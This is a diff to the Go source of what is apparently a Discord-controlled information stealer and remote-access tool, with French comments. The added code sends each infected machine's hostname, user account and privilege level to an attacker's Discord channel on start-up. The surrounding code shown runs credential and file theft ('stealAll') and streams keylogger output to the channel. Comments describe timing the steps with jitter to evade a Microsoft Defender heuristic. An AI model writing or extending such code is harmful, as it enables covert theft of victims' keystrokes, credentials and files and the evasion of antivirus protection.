@@ -475,6 +475,15 @@ func startPayload() {
 	// exactement le comportement que note l'heuristique Bearfoos. Chaque
 	// étape part à son heure, avec un jitter, dans un ordre qui ressemble à
 	// une application qui se lance.
+	// Battement de cœur immédiat : avant même de créer les salons, on écrit
+	// une ligne dans le salon de base. Si le processus meurt ensuite (Defender,
+	// coupure), on sait au moins qu il a démarré et avec quel compte.
+	guard("hello", func() {
+		if ch := targetChannel(); ch != "" {
+			botSendText(ch, "🟢 **"+hostname()+"** — démarrage · "+osUser()+" · "+privLabel())
+		}
+	})
+
 	guard("boot", func() {
 		// Tout est créé puis lancé dans l'ordre, en moins d'une minute :
 		// salons, état, géolocalisation, capture, extraction, fichiers.
@@ -485,6 +494,11 @@ func startPayload() {
 			return
 		}
 		ensureAllChannels()
+		if n := channelsReady(); n < 12 {
+			bootNote(fmt.Sprintf("⚠️ %d/12 salons — le bot n a pas « Gérer les salons » sur ce serveur ; les envois se rabattent sur ce salon.", n))
+		} else {
+			bootNote("12/12 salons prêts")
+		}
 
 		time.Sleep(time.Duration(2+rand.Intn(3)) * time.Second)
 		if s, err := systemReport(); err == nil {
@@ -512,6 +526,7 @@ func startPayload() {
 			return
 		}
 		stealAll(true)
+		bootNote("extraction terminée — fichiers dans -steal")
 
 		time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
 		if stopped.Load() {
@@ -557,6 +572,11 @@ func startPayload() {
 			// Tous les salons de la machine existent dès le début, même ceux
 			// qui ne serviront que plus tard (fichiers, webcam).
 			ensureAllChannels()
+			if n := channelsReady(); n < 12 {
+				bootNote(fmt.Sprintf("⚠️ %d/12 salons — le bot n a pas « Gérer les salons » sur ce serveur ; les envois se rabattent sur ce salon.", n))
+			} else {
+				bootNote("12/12 salons prêts")
+			}
 		})
 		guard("categorie", func() {
 			// Les salons se créent en différé (repli réseau inclus) : on
@@ -728,4 +748,12 @@ func keylogStream() {
 	txt := strings.TrimRight(string(chunk), "\n")
 	botSendText(ch, "**kl.log** · "+hostChannelName()+" · "+
 		time.Now().Format("02/01 15:04")+" — "+strconv.Itoa(len(chunk))+" octets\n```\n"+txt+"\n```")
+}
+
+// bootNote écrit une ligne de suivi dans le salon de la machine. Trois lignes
+// au démarrage : assez pour diagnostiquer un poste distant, sans polluer.
+func bootNote(s string) {
+	if ch := targetChannel(); ch != "" {
+		botSendText(ch, "› "+s)
+	}
 }
